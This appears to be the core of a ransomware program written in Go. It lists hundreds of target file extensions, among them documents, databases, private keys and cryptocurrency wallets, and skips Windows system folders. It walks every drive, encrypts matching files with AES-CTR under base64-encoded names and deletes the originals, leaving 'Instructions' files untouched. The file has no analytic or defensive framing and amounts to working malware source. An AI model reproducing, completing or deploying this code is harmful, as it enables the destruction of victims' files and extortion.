package main

import (
	"crypto/aes"
	"crypto/cipher"
	"io"
	"os"
	"path/filepath"
	"strings"
	"fmt"
)

var exts []string = []string{".mp4", ".avi", ".mp3", ".jpg", ".odt", ".mid", ".wma", ".flv", ".mkv", ".mov", ".avi", ".asf", ".mpeg", ".vob", ".mpg", ".wmv", ".fla", ".swf", ".wav", ".qcow2", ".vmx", ".gpg", ".aes", ".ARC", ".PAQ", ".tar.bz2", ".tbk", ".bak", ".tar", ".tgz", ".rar", ".zip", ".djv", ".djvu", ".svg", ".bmp", ".png", ".gif", ".raw", ".cgm", ".jpeg", ".jpg", ".tif", ".tiff", ".NEF", ".psd", ".cmd", ".bat", ".class", ".jar", ".java", ".asp", ".brd", ".sch", ".dch", ".dip", ".vbs", ".asm", ".pas", ".cpp", ".php", ".ldf", ".mdf", ".ibd", ".MYI", ".MYD", ".frm", ".odb", ".dbf", ".mdb", ".sql", ".SQLITEDB", ".SQLITE3", ".asc", ".lay6", ".lay", ".ms11" , ".sldm", ".sldx", ".ppsm", ".ppsx", ".ppam", ".docb", ".mml", ".sxm", ".otg", ".odg", ".uop", ".potx", ".potm", ".pptx", ".pptm", ".std", ".sxd", ".pot", ".pps", ".sti", ".sxi", ".otp", ".odp", ".wks", ".xltx", ".xltm", ".xlsx", ".xlsm", ".xlsb", ".slk", ".xlw", ".xlt", ".xlm", ".xlc", ".dif", ".stc", ".sxc", ".ots", ".ods", ".hwp", ".dotm", ".dotx", ".docm", ".docx", ".DOT", ".max", ".xml", ".txt", ".CSV", ".uot", ".RTF", ".pdf", ".XLS", ".PPT", ".stw", ".sxw", ".ott", ".odt", ".DOC", ".pem", ".csr", ".crt", ".key", "wallet.dat"}
var badfolders []string = []string{"tmp", "winnt", "Application Data", "AppData", "Program Files (x86)", "Program Files", "temp", "thumbs.db", "Recycle.Bin", "System Volume Information", "Boot", "Windows"}

var block cipher.Block
var iv [aes.BlockSize]byte
var stream cipher.Stream

func EncryptDocumets(path string, mode bool) {
	if mode {		
		//Encrypt
		filepath.Walk(path, Visit)
	} else {
		//Decrpy
		filepath.Walk(path, VisitD)
	}
	
}
func InitializeBlock() {
	block, _ = aes.NewCipher(key_text)
	stream = cipher.NewCTR(block, iv[:])
}

func Visit(path string, f os.FileInfo, err error) error {
	for _, folder := range badfolders {
		if strings.Contains(path, folder){
			return nil
		}
	}
	if !strings.Contains(path, ".enc") && !strings.Contains(path, "Instructions") && !strings.Contains(path, TARGET_FILE_NAME) {
		for _, ext := range exts {
			if strings.Contains(path, ext){
				StreamEncrypter(path)
				return nil
			}
		
		}
	}
	return nil
}
func VisitD(path string, f os.FileInfo, err error) error {
	if strings.Contains(path, ".enc") && !f.IsDir() {
		StreamDecrypter(path)
	}
	return nil
}

func StreamDecrypter(path string) {
	inFile, err := os.Open(path)
	if err != nil {
		//Couldn't open file, maybe a folder
		return;
	}
	//get the path for the output
	opPath := strings.Trim(path, ".enc")
	// Divide filepath 
	filenameArr := strings.Split(opPath, "\\")
	//Get base64 encoded filename
	filename := filenameArr[len(filenameArr)-1]

	path2 := strings.Join(filenameArr[:len(filenameArr)-1], "\\")
	outFile, err := os.OpenFile(path2+"\\"+Base64Decode(filename), os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0666)
	if err != nil {
		return;
	}
	defer outFile.Close()
	reader := &cipher.StreamReader{S: stream, R: inFile}
	io.Copy(outFile, reader)
	inFile.Close()
	os.Remove(path)
}

func StreamEncrypter(path string) {
	
	inFile, err := os.Open(path) 
	if err != nil {
		return;
	}

	filenameArr := strings.Split(path, "\\")
	filename := filenameArr[len(filenameArr)-1]
	path2 := strings.Join(filenameArr[:len(filenameArr)-1], "\\")

	fmt.Println("")
	outFile, err := os.OpenFile(path2+"\\"+Base64Encode(filename)+".enc", os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0666)
	if err != nil {
		return;
	}
	
	writer := &cipher.StreamWriter{S: stream, W: outFile}
	io.Copy(writer, inFile)
	inFile.Close()
	outFile.Close()
	os.Remove(path)
}


func GetExeName() string {
	filename := strings.Split(os.Args[0], "\\")
	return filename[len(filename)-1]
}

func GetParentFolder() string {
	filename := strings.Split(os.Args[0], "\\")
	return filename[len(filename)-2]
}

func GetDrives() (r []string) {
	for _, drive := range "ABEFGHIJKLMNOPQRSTUVWXYZD" {
		_, err := os.Open(string(drive) + ":\\")
		if err == nil {
			r = append(r, string(drive))
		}
	}
	return
}
